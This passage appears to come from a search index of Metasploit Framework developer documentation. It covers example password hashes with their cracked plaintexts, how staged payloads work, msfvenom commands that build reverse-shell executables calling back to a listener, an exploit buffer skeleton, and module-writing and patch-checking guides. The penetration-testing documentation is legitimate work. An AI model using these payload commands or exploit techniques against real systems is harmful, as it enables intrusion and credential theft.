0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 foo mssql auxiliary/scanner/mssql/mssql_hashdump auxiliary/analyze/jtr_mssql_fast MSSQL (2012) mssql12_Password1! 0x0200F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16 Password! mssql12 auxiliary/scanner/mssql/mssql_hashdump auxiliary/analyze/jtr_mssql_fast MySQL mysql_probe 445ff82636a7ba59 probe mysql auxiliary/scanner/mysql/mysql_hashdump auxiliary/analyze/jtr_mysql_fast MySQL SHA1 mysql-sha1_tere *5AD8F88516BD021DD43F171E2C785C69F8E54ADB tere mysql-sha1 auxiliary/scanner/mysql/mysql_hashdump auxiliary/analyze/jtr_mysql_fast Oracle simon 4F8BC1809CB2AF77 A des,oracle auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle SYSTEM 9EEDFA0AD26C6D52 THALES des,oracle auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle 11 DEMO S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C epsilon raw-sha1,oracle auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle 11 oracle11_epsilon S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C epsilon raw-sha1,oracle modules/auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle 12 oracle12_epsilon H:DC9894A01797D91D92ECA1DA66242209;T:E3243B98974159CC24FD2C9A8B30BA62E0E83B6CA2FC7C55177C3A7F82602E3BDD17CEB9B9091CF9DAD672B8BE961A9EAC4D344BDBA878EDC5DCB5899F689EBD8DD1BE3F67BFF9813A464382381AB36B epsilon pbkdf2,oracle12c auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Postgres example md5be86a79bf2043622d58d5453c47d4860 password raw-md5,postgres auxiliary/scanner/postgres/postgres_hashdump auxiliary/analyze/jtr_postgres_fast","title":"Example Hashes"},{"location":"dev/dark/How-payloads-work/","text":"How Payloads Work Payload modules are stored in modules/payloads/{singles,stages,stagers}/<platform> . When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism. Payloads are given reference names that indicate all the pieces, like so: - Staged payloads: <platform>/[arch]/<stage>/<stager> - Single payloads: <platform>/[arch]/<single> This results in payloads like windows/x64/meterpreter/reverse_tcp . Breaking that down, the platform is windows , the architecture is x64 , the final stage we're delivering is meterpreter , and the stager delivering it is reverse_tcp . Note that architecture is optional because in some cases it is either unnecessary or implied. An example is php/meterpreter/reverse_tcp . Arch is unneeded for PHP payloads because we're delivering interpreted code rather than native. Singles Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don't have to. An example of a scenario where you might want a single is when the target has no network access -- a fileformat exploit delivered via USB key is still possible. Stagers Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code. Stages Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C. Delivering stages The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you're really just creating the stager. So the following commands would create functionally identical exe files: msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp (Note that these are functionally identical -- there is a lot of randomization that goes into it so no two executables are exactly the same.) The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https). In the case of a shell stage, Metasploit will connect the remote process's stdio to your terminal when you interact with it. In the case of a [[Meterpreter]] stage, Metasploit will begin speaking the Meterpreter wire protocol.","title":"How Payloads Work"},{"location":"dev/dark/How-payloads-work/#how-payloads-work","text":"Payload modules are stored in modules/payloads/{singles,stages,stagers}/<platform> . When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism. Payloads are given reference names that indicate all the pieces, like so: - Staged payloads: <platform>/[arch]/<stage>/<stager> - Single payloads: <platform>/[arch]/<single> This results in payloads like windows/x64/meterpreter/reverse_tcp . Breaking that down, the platform is windows , the architecture is x64 , the final stage we're delivering is meterpreter , and the stager delivering it is reverse_tcp . Note that architecture is optional because in some cases it is either unnecessary or implied. An example is php/meterpreter/reverse_tcp . Arch is unneeded for PHP payloads because we're delivering interpreted code rather than native.","title":"How Payloads Work"},{"location":"dev/dark/How-payloads-work/#singles","text":"Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don't have to. An example of a scenario where you might want a single is when the target has no network access -- a fileformat exploit delivered via USB key is still possible.","title":"Singles"},{"location":"dev/dark/How-payloads-work/#stagers","text":"Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code.","title":"Stagers"},{"location":"dev/dark/How-payloads-work/#stages","text":"Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C.","title":"Stages"},{"location":"dev/dark/How-payloads-work/#delivering-stages","text":"The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you're really just creating the stager. So the following commands would create functionally identical exe files: msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp (Note that these are functionally identical -- there is a lot of randomization that goes into it so no two executables are exactly the same.) The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https). In the case of a shell stage, Metasploit will connect the remote process's stdio to your terminal when you interact with it. In the case of a [[Meterpreter]] stage, Metasploit will begin speaking the Meterpreter wire protocol.","title":"Delivering stages"},{"location":"dev/dark/How-to-Apply-to-GSoC/","text":"Note: Final project proposals must be submitted through to Google through the GSoC Program Website, as stated in the rules . Before submitting to the GSoC website, it is also helpful to solicit proposal feedback via one of the contact methods found on https://metasploit.com/contribute . If you don't hear back right away on a proposal, don't give up! Contributors may be busy, or you may need to try again to get someone's attention (but don't spam). When making your proposal, please include: Title A brief description of what you would like to work on. See [[GSoC-2018-Project-Ideas]] for ideas. Vitals Your name Contact info - include at least: an email address github user name Freenode nick Skillz What programming languages are you familiar with, in order of proficiency? Most of Metasploit is written in Ruby; for any project you will most likely need at least a passing knowledge of it. If you want to work on Meterpreter or Mettle, C will be necessary as well. What other projects have you worked on before? Your project Fill in the details. What exactly do you want to accomplish?","title":"How to Apply to GSoC"},{"location":"dev/dark/How-to-Apply-to-GSoC/#title","text":"A brief description of what you would like to work on. See [[GSoC-2018-Project-Ideas]] for ideas.","title":"Title"},{"location":"dev/dark/How-to-Apply-to-GSoC/#vitals","text":"Your name Contact info - include at least: an email address github user name Freenode nick","title":"Vitals"},{"location":"dev/dark/How-to-Apply-to-GSoC/#skillz","text":"What programming languages are you familiar with, in order of proficiency? Most of Metasploit is written in Ruby; for any project you will most likely need at least a passing knowledge of it. If you want to work on Meterpreter or Mettle, C will be necessary as well. What other projects have you worked on before?","title":"Skillz"},{"location":"dev/dark/How-to-Apply-to-GSoC/#your-project","text":"Fill in the details. What exactly do you want to accomplish?","title":"Your project"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/","text":"This is an example of how to write a module that uses the HttpClient mixin to send a basic HTTP request. There are mainly two common methods you will see: send_request_raw - You use this to send a raw HTTP request. Usually, you will want this method if you need something that violates the specification; in most other cases, you should prefer send_request_cgi . If you wish to learn about how this method works, look at the documentation for Rex::Proto::Http::Client#request_raw . Here's a basic example of how to use send_request_raw : send_request_raw ({ 'uri' => '/index.php' }) send_request_cgi - You use this to send a more CGI-compatible HTTP request. If your request contains a query string (or POST data), then you should use this. If you wish to learn about how this method works, check out Rex::Proto::Http::Client#request_cgi . Here's a very basic example for send_request_cgi : send_request_cgi ({ 'method' => 'GET' , 'uri' => '/hello_world.php' , 'vars_get' => { 'param_1' => 'abc' , 'param_2' => '123' } }) Please note : send_request_raw and send_request_cgi will return a nil if there's a timeout, so please make sure to account for that condition when you handle the return value. URI Parsing Before you send a HTTP request, you will most likely have to do some URI parsing. This is a tricky task, because sometimes when you join paths, you may accidentally get double slashes, like this: \"/test//index.php\". Or for some reason you have a missing slash. These are really commonly made mistakes. So here's how you can handle it safely: 1 - Register your default URI datastore option as 'TARGETURI': Example: register_options ( [ OptString . new ( 'TARGETURI' , [ true , 'The base path to XXX application' , '/xxx_v1/' ] ) ] , self . class ) 2 - Load your TARGETURI with target_uri , that way the URI input validation will kick in, and then you get a real URI object: In this example, we'll just load the path: uri = target_uri . path 3 - When you want to join another URI, always use normalize_uri : Example: # Returns: \"/xxx_v1/admin/upload.php\" uri = normalize_uri ( uri , 'admin' , 'upload.php' ) 4 - When you're done normalizing the URI, you're ready to use send_request_cgi or send_request_raw Please note: The normalize_uri method will always follow these rules: The URI should always begin with a slash. You will have to decide if you need the trailing slash or not. There should be no double slashes. Full Example require 'msf/core' class MetasploitModule < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = {}) super ( update_info ( info , 'Name' => 'HttpClient Example' , 'Description' => %q{ Do a send_request_cgi() } , 'Author' => [ 'sinn3r' ] , 'License' => MSF_LICENSE )) register_options ( [ OptString . new ( 'TARGETURI' , [ true , 'The base path' , '/' ] ) ] , self . class ) end def run uri = target_uri . path res = send_request_cgi ({ 'method' => 'GET' , 'uri' => normalize_uri ( uri , 'admin' , 'index.php' ), 'vars_get' => { 'p1' => \"This is param 1\" , 'p2' => \"This is param 2\" } }) if res && res . code == 200 print_good ( \"I got a 200, awesome\" ) else print_error ( \"No 200, feeling blue\" ) end end end Working with Burp Suite Burp Suite is a useful tool to examine or modify HTTPS traffic while developing a module using HttpClient. To do this: Start Burp: java -jar burpsuite.jar In Burp, click on the Proxies tab, and then Options. Configure the proxy listener there. In this example, let's say we have a listener on port 6666. Once the Burp listener is up, start msfconsole and load the module you're working on. Enter: set Proxies HTTP:127.0.0.1:6666 Go ahead and run the module, Burp should intercept the HTTPS traffic. Note that Burp only supports HTTPS for HttpClient. This problem is only specific to Burp and Metasploit. If you need to examine HTTP traffic for HttpClient, a workaround is adding the following method in your module. This will override HttpClient's send_request_* method, and return the modified output: def send_request_cgi ( opts ) res = super ( opts ) puts res . request . to_s puts puts res . to_s puts puts end You can do the same for send_request_raw as well. Other Common questions: 1 - Can I use vars_get and vars_post together? Yes. When you supply a hash to vars_get , basically it means \"put all this data in the query string\". When you supply a hash to vars_post , it means \"put all this data in the body.\" All of them will be in the same request. You do need to make sure you're using send_request_cgi , of course. 2 - I can't use vars_get or vars_post due to some weird reason, what to do? Do mention about this problem in the code (as a comment). If you can't use vars_post , you can try the data key instead, which will send your post data raw. Normally, the most common solution to get around vars_get is to leave your stuff in the uri key. msftidy will flag this, but only as an \"Info\" and not a warning, which means you should still pass msftidy anyway. If this is a common problem, we can always change msftidy. 3 - Do I need to manually do basic auth? You do not need to manually do basic auth in your request, because HttpClient should automatically do that for you. All you have to do is set the username and password in the datastore options, and then the mixin will use that when the web server asks. References https://github.com/rapid7/metasploit-framework/wiki/How-to-send-an-HTTP-request-using-Rex%3A%3AProto%3A%3AHttp%3A%3AClient","title":"How to Send an HTTP Request Using HTTPClient"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/#there-are-mainly-two-common-methods-you-will-see","text":"send_request_raw - You use this to send a raw HTTP request. Usually, you will want this method if you need something that violates the specification; in most other cases, you should prefer send_request_cgi . If you wish to learn about how this method works, look at the documentation for Rex::Proto::Http::Client#request_raw . Here's a basic example of how to use send_request_raw : send_request_raw ({ 'uri' => '/index.php' }) send_request_cgi - You use this to send a more CGI-compatible HTTP request. If your request contains a query string (or POST data), then you should use this. If you wish to learn about how this method works, check out Rex::Proto::Http::Client#request_cgi . Here's a very basic example for send_request_cgi : send_request_cgi ({ 'method' => 'GET' , 'uri' => '/hello_world.php' , 'vars_get' => { 'param_1' => 'abc' , 'param_2' => '123' } }) Please note : send_request_raw and send_request_cgi will return a nil if there's a timeout, so please make sure to account for that condition when you handle the return value.","title":"There are mainly two common methods you will see:"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/#uri-parsing","text":"Before you send a HTTP request, you will most likely have to do some URI parsing. This is a tricky task, because sometimes when you join paths, you may accidentally get double slashes, like this: \"/test//index.php\". Or for some reason you have a missing slash. These are really commonly made mistakes. So here's how you can handle it safely: 1 - Register your default URI datastore option as 'TARGETURI': Example: register_options ( [ OptString . new ( 'TARGETURI' , [ true , 'The base path to XXX application' , '/xxx_v1/' ] ) ] , self . class ) 2 - Load your TARGETURI with target_uri , that way the URI input validation will kick in, and then you get a real URI object: In this example, we'll just load the path: uri = target_uri . path 3 - When you want to join another URI, always use normalize_uri : Example: # Returns: \"/xxx_v1/admin/upload.php\" uri = normalize_uri ( uri , 'admin' , 'upload.php' ) 4 - When you're done normalizing the URI, you're ready to use send_request_cgi or send_request_raw Please note: The normalize_uri method will always follow these rules: The URI should always begin with a slash. You will have to decide if you need the trailing slash or not. There should be no double slashes.","title":"URI Parsing"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/#full-example","text":"require 'msf/core' class MetasploitModule < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = {}) super ( update_info ( info , 'Name' => 'HttpClient Example' , 'Description' => %q{ Do a send_request_cgi() } , 'Author' => [ 'sinn3r' ] , 'License' => MSF_LICENSE )) register_options ( [ OptString . new ( 'TARGETURI' , [ true , 'The base path' , '/' ] ) ] , self . class ) end def run uri = target_uri . path res = send_request_cgi ({ 'method' => 'GET' , 'uri' => normalize_uri ( uri , 'admin' , 'index.php' ), 'vars_get' => { 'p1' => \"This is param 1\" , 'p2' => \"This is param 2\" } }) if res && res . code == 200 print_good ( \"I got a 200, awesome\" ) else print_error ( \"No 200, feeling blue\" ) end end end","title":"Full Example"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/#working-with-burp-suite","text":"Burp Suite is a useful tool to examine or modify HTTPS traffic while developing a module using HttpClient. To do this: Start Burp: java -jar burpsuite.jar In Burp, click on the Proxies tab, and then Options. Configure the proxy listener there. In this example, let's say we have a listener on port 6666. Once the Burp listener is up, start msfconsole and load the module you're working on. Enter: set Proxies HTTP:127.0.0.1:6666 Go ahead and run the module, Burp should intercept the HTTPS traffic. Note that Burp only supports HTTPS for HttpClient. This problem is only specific to Burp and Metasploit. If you need to examine HTTP traffic for HttpClient, a workaround is adding the following method in your module. This will override HttpClient's send_request_* method, and return the modified output: def send_request_cgi ( opts ) res = super ( opts ) puts res . request . to_s puts puts res . to_s puts puts end You can do the same for send_request_raw as well.","title":"Working with Burp Suite"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/#other-common-questions","text":"1 - Can I use vars_get and vars_post together? Yes. When you supply a hash to vars_get , basically it means \"put all this data in the query string\". When you supply a hash to vars_post , it means \"put all this data in the body.\" All of them will be in the same request. You do need to make sure you're using send_request_cgi , of course. 2 - I can't use vars_get or vars_post due to some weird reason, what to do? Do mention about this problem in the code (as a comment). If you can't use vars_post , you can try the data key instead, which will send your post data raw. Normally, the most common solution to get around vars_get is to leave your stuff in the uri key. msftidy will flag this, but only as an \"Info\" and not a warning, which means you should still pass msftidy anyway. If this is a common problem, we can always change msftidy. 3 - Do I need to manually do basic auth? You do not need to manually do basic auth in your request, because HttpClient should automatically do that for you. All you have to do is set the username and password in the datastore options, and then the mixin will use that when the web server asks.","title":"Other Common questions:"},{"location":"dev/dark/How-to-Send-an-HTTP-Request-Using-HTTPClient/#references","text":"https://github.com/rapid7/metasploit-framework/wiki/How-to-send-an-HTTP-request-using-Rex%3A%3AProto%3A%3AHttp%3A%3AClient","title":"References"},{"location":"dev/dark/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit/","text":"Msf::Exploit::FILEFORMAT is the mixin to use to create a file format exploit. There actually isn't much in the mixin, but the most important method is this: file_create : Usage for file_create As the name implies, the file_create method allows you to create a file. You should be using this method because it does more than just writing data to disk. One of the important things it does is it will report the file creation to the database in the format of #{ltype}.localpath , and the file will always be written to Metasploit's local directory defined in Msf::Config.local_directory (by default this path is ~/.msf4/local ), which keep files nice and organized. To use the mixin, first include Msf::Exploit::FILEFORMAT under the scope of your Metasploit3 class: include Msf :: Exploit :: FILEFORMAT And here's an example of using file_create to build an imaginary exploit: # This is my imaginary exploit buf = \"\" buf << \"A\" * 1024 buf << [ 0x40201f01 ]. pack ( \"V\" ) buf << \" \\x90 \" * 10 buf << payload . encoded file_create ( buf ) Custom filename The Msf::Exploit::FILENAME mixin by default has a registered FILENAME datastore option, and it is actually optional. If there's no filename provided, the mixin will set the name in this format: \"exploit.fileformat.#{self.shortname}\" , where self.shortname means the shorter version of the module name. If you wish to set a default one (but still changeable by the user), then you simply register it again in the module, like this: register_options ( [ OptString . new ( 'FILENAME' , [ true , 'The malicious file name' , 'msf.jpg' ] ) ] , self . class ) Fixed filename Occasionally, you might not want your user to change the filename at all. A lazy trick to do that is by modifying the FILENAME datastore option at runtime, but this is very much not recommended. In fact, if you do this, you will not pass msftidy . Instead, here's how it's done properly: 1 - Deregister the FILENAME option deregister_options ( 'FILENAME' ) 2 - Next, override the file_format_filename method, and make it return the filename you want: def file_format_filename 'something.jpg' end 3 - Finally, please leave a note about this in the module description. References https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/fileformat.rb https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows/local","title":"How to Use the FILEFORMAT mixin to create a file format exploit"},{"location":"dev/dark/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit/#usage-for-file_create","text":"As the name implies, the file_create method allows you to create a file. You should be using this method because it does more than just writing data to disk. One of the important things it does is it will report the file creation to the database in the format of #{ltype}.localpath , and the file will always be written to Metasploit's local directory defined in Msf::Config.local_directory (by default this path is ~/.msf4/local ), which keep files nice and organized. To use the mixin, first include Msf::Exploit::FILEFORMAT under the scope of your Metasploit3 class: include Msf :: Exploit :: FILEFORMAT And here's an example of using file_create to build an imaginary exploit: # This is my imaginary exploit buf = \"\" buf << \"A\" * 1024 buf << [ 0x40201f01 ]. pack ( \"V\" ) buf << \" \\x90 \" * 10 buf << payload . encoded file_create ( buf )","title":"Usage for file_create"},{"location":"dev/dark/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit/#custom-filename","text":"The Msf::Exploit::FILENAME mixin by default has a registered FILENAME datastore option, and it is actually optional. If there's no filename provided, the mixin will set the name in this format: \"exploit.fileformat.#{self.shortname}\" , where self.shortname means the shorter version of the module name. If you wish to set a default one (but still changeable by the user), then you simply register it again in the module, like this: register_options ( [ OptString . new ( 'FILENAME' , [ true , 'The malicious file name' , 'msf.jpg' ] ) ] , self . class )","title":"Custom filename"},{"location":"dev/dark/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit/#fixed-filename","text":"Occasionally, you might not want your user to change the filename at all. A lazy trick to do that is by modifying the FILENAME datastore option at runtime, but this is very much not recommended. In fact, if you do this, you will not pass msftidy . Instead, here's how it's done properly: 1 - Deregister the FILENAME option deregister_options ( 'FILENAME' ) 2 - Next, override the file_format_filename method, and make it return the filename you want: def file_format_filename 'something.jpg' end 3 - Finally, please leave a note about this in the module description.","title":"Fixed filename"},{"location":"dev/dark/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit/#references","text":"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/fileformat.rb https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows/local","title":"References"},{"location":"dev/dark/How-to-XOR-with-Metasploit-Framework-Compiler/","text":"How to XOR with Metasploit::Framework::Compiler The Metasploit C compiler has built-in support for XOR encoding and decoding, which is implemented as the xor.h header. Code Example #include <Windows.h> #include <String.h> #include <xor.h> int main ( int args , char ** argv ) { char * xorStr = \"NNNN\" ; char xorKey = 0x0f ; LPVOID lpBuf = VirtualAlloc ( NULL , sizeof ( int ) * strlen ( xorStr ), MEM_COMMIT , PAGE_EXECUTE_READWRITE ); memset ( lpBuf , '\\0' , strlen ( xorStr )); xor (( char * ) lpBuf , xorStr , xorKey , strlen ( xorStr )); MessageBox ( NULL , lpBuf , \"Test\" , MB_OK ); return 0 ; } To compile, use Metasploit::Framework::Compiler::Windows.compile_c","title":"How to XOR with Metasploit::Framework::Compiler"},{"location":"dev/dark/How-to-XOR-with-Metasploit-Framework-Compiler/#how-to-xor-with-metasploitframeworkcompiler","text":"The Metasploit C compiler has built-in support for XOR encoding and decoding, which is implemented as the xor.h header.","title":"How to XOR with Metasploit::Framework::Compiler"},{"location":"dev/dark/How-to-XOR-with-Metasploit-Framework-Compiler/#code-example","text":"#include <Windows.h> #include <String.h> #include <xor.h> int main ( int args , char ** argv ) { char * xorStr = \"NNNN\" ; char xorKey = 0x0f ; LPVOID lpBuf = VirtualAlloc ( NULL , sizeof ( int ) * strlen ( xorStr ), MEM_COMMIT , PAGE_EXECUTE_READWRITE ); memset ( lpBuf , '\\0' , strlen ( xorStr )); xor (( char * ) lpBuf , xorStr , xorKey , strlen ( xorStr )); MessageBox ( NULL , lpBuf , \"Test\" , MB_OK ); return 0 ; } To compile, use Metasploit::Framework::Compiler::Windows.compile_c","title":"Code Example"},{"location":"dev/dark/How-to-add-and-update-gems-in-metasploit-framework/","text":"Update: We have automated this process (it runs every Thursday at noon US Central Time), and 99.9% of the time you will not need to follow any of the below steps. That said, if you need to update a gem in a PR, this is still a good procedure to follow. Sometimes you might want to pull in a new Ruby library or update an existing one to get more functionality. Metasploit leverages Bundler to manage Ruby gems and make dependencies easy. This document goes over the things you need to know when updating or adding gems to Metasploit. The Gemfile Gems that are only sometimes used (say, only in test mode, or only when running with a database) are listed in a relevant Bundler group ( test or db respectively) in the root Gemfile . The metasploit-framework.gemspec file Gems that are always needed by Metasploit are kept in the metasploit-framework.gemspec file (this file is actually pulled into the Gemfile when calculating dependencies). The Lock File The Gemfile.lock file holds the absolute versions of the Gems we want and keeps track of all the subdependencies. You should never need to manually edit this file: bundler will do it for you when you run bundle install after adding a gem. We keep this committed in the repo to ensure that all users are always on the same gem versions. Updating or adding a gem If the gem is needed only for a specific Bundler group (like test or db ), you should update the Gemfile : Add the Gem you want to the correct Group, or just update the version constraint. Check Bundler's docs for the various ways to express version constraints: gem 'my_favorite', '~> 1.0' Run bundle install Commit any changes to the Gemfile.lock file If the gem is needed any time metasploit-framework is used, you should update the metasploit-framework.gemspec file: Add the gem as a runtime dependency, or just update the version constraint. Check Bundler's docs for the various ways to express version constraints: spec.add_runtime_dependency 'my_favorite_gem', '~> 3.0.1' Run bundle install Commit any changes to the Gemfile.lock file. Gemfile.local A Gemfile.local file is useful for adding temporary gems to the metasploit-framework, like pry-stack-explorer or other handy debugging libs; you don't want to commit these gems into the repo, but might need them from time to time. To use a Gemfile.local file: Rename the Gemfile.local.example file in the repo root to Gemfile.local Add the temporary gems you want to this file Run bundle install Make sure you do not commit the Gemfile.lock: git checkout -- Gemfile.lock","title":"How to add and update gems in metasploit framework"},{"location":"dev/dark/How-to-add-and-update-gems-in-metasploit-framework/#the-gemfile","text":"Gems that are only sometimes used (say, only in test mode, or only when running with a database) are listed in a relevant Bundler group ( test or db respectively) in the root Gemfile .","title":"The Gemfile"},{"location":"dev/dark/How-to-add-and-update-gems-in-metasploit-framework/#the-metasploit-frameworkgemspec-file","text":"Gems that are always needed by Metasploit are kept in the metasploit-framework.gemspec file (this file is actually pulled into the Gemfile when calculating dependencies).","title":"The metasploit-framework.gemspec file"},{"location":"dev/dark/How-to-add-and-update-gems-in-metasploit-framework/#the-lock-file","text":"The Gemfile.lock file holds the absolute versions of the Gems we want and keeps track of all the subdependencies. You should never need to manually edit this file: bundler will do it for you when you run bundle install after adding a gem. We keep this committed in the repo to ensure that all users are always on the same gem versions.","title":"The Lock File"},{"location":"dev/dark/How-to-add-and-update-gems-in-metasploit-framework/#updating-or-adding-a-gem","text":"If the gem is needed only for a specific Bundler group (like test or db ), you should update the Gemfile : Add the Gem you want to the correct Group, or just update the version constraint. Check Bundler's docs for the various ways to express version constraints: gem 'my_favorite', '~> 1.0' Run bundle install Commit any changes to the Gemfile.lock file If the gem is needed any time metasploit-framework is used, you should update the metasploit-framework.gemspec file: Add the gem as a runtime dependency, or just update the version constraint. Check Bundler's docs for the various ways to express version constraints: spec.add_runtime_dependency 'my_favorite_gem', '~> 3.0.1' Run bundle install Commit any changes to the Gemfile.lock file.","title":"Updating or adding a gem"},{"location":"dev/dark/How-to-add-and-update-gems-in-metasploit-framework/#gemfilelocal","text":"A Gemfile.local file is useful for adding temporary gems to the metasploit-framework, like pry-stack-explorer or other handy debugging libs; you don't want to commit these gems into the repo, but might need them from time to time. To use a Gemfile.local file: Rename the Gemfile.local.example file in the repo root to Gemfile.local Add the temporary gems you want to this file Run bundle install Make sure you do not commit the Gemfile.lock: git checkout -- Gemfile.lock","title":"Gemfile.local"},{"location":"dev/dark/How-to-check-Microsoft-patch-levels-for-your-exploit/","text":"Checking patch levels is an important task for vulnerability research or exploit development. As a bug-hunting kind of guy, you should care about patch levels because say you have an 0day for Internet Explorer 10, you can't always assume it affects all IE 10 builds since its debut (2012). If you realize your 0day only affects one or two builds, how much of a threat is it? Probably not as bad as you think. If you're an exploit developer, you're checking patches for another reason: maximum reliability. There are a lot of ways your exploit can fail, a bad gadget due to a change by a system update is easily one of them. If this update occurred at a pretty early stage, chances are your exploit will fail a lot, too. How to collect Microsoft patches If you're kind of hardcore with patch diffing, you probably maintain your own database of DLLs. But this may require a lot of disk space, for most people it's probably not worth it unless you have to look at these DLLs pretty much everyday. A more economic way is probably have a way to track all these patches, and have some sort of interface to allow quick and easy access to them. Luckily, Microsoft maintains a list of all the patches in an Excel file that you can download here: http://www.microsoft.com/en-us/download/confirmation.aspx?id=36982 If you prefer some sort of GUI for searching, you can use Security TechCenter's My Security Bulletins Dashboard . You can edit this dashboard to add specific filters, such as the Windows version, Internet Explorer version, Office, etc, etc. For example, if I want to find all the Internet Explorer 10 patches for Windows 7 since its debut, I can add the following filters: Windows 7 Internet Explorer And then I sort by date from September 2012 to 2014, I get: 22 results. But of course, this number will go up because IE 10 is still supported. There are also other desktop or command-line tools that will basically check missing patches for your Windows system, such as Windows Update Powershell Module , in some cases this may work better. Patch extraction Old patches used to be packaged as EXEs, and this kind can be extracted by using decompression tools such as 7zip . Internet Explorer 6 patches, for example, can be extracted this way. Newer patches packaged as EXEs support the /X flag for extraction. For example, the following will extract the patch under the same directory. Patches such as Internet Explorer 8 (for XP) can be extracted this way. Windows[Something]-KB[Something]-x86-ENU.exe /X:. Most patches nowadays are packaged as MSUs. Here's what you have to do: Put all your *.msu files under the same directory (in Windows) Run tools/extract_msu.bat [absolute directory path to *.msu files) extract_msu.bat should automatically extract all the *.msu files. The \"extracted\" sub-directory in each new folder is where you can find the updated components. Note: The update folders might be labeled as GDR or QRE. GDR indicates Generation Distribution Release, while QRE means Quick Fix Engineering. Checking gadgets in patches The quickest way to check gadgets across different patches is by using Metasploit's msfpescan utility (or msfbinscan, which is smart enough to know it's PE format). It's really easy, all you have to do is put the DLLs in the same directory, and then do: $ ./msfbinscan -D -a [address] -A 10 /patches/*.dll What that does is the tool will disassemble all the DLLs under that directory, at that specific address for 10 bytes. You can probably automate a little more to quickly identify which DLLs don't have right gadget, and if that's the case for you, that means the gadget you're using is unsafe. You should find another one that's more reliable.","title":"How to check Microsoft patch levels for your exploit"},{"location":"dev/dark/How-to-check-Microsoft-patch-levels-for-your-exploit/#how-to-collect-microsoft-patches","text":"If you're kind of hardcore with patch diffing, you probably maintain your own database of DLLs. But this may require a lot of disk space, for most people it's probably not worth it unless you have to look at these DLLs pretty much everyday. A more economic way is probably have a way to track all these patches, and have some sort of interface to allow quick and easy access to them. Luckily, Microsoft maintains a list of all the patches in an Excel file that you can download here: http://www.microsoft.com/en-us/download/confirmation.aspx?id=36982 If you prefer some sort of GUI for searching, you can use Security TechCenter's My Security Bulletins Dashboard . You can edit this dashboard to add specific filters, such as the Windows version, Internet Explorer version, Office, etc, etc. For example, if I want to find all the Internet Explorer 10 patches for Windows 7 since its debut, I can add the following filters: 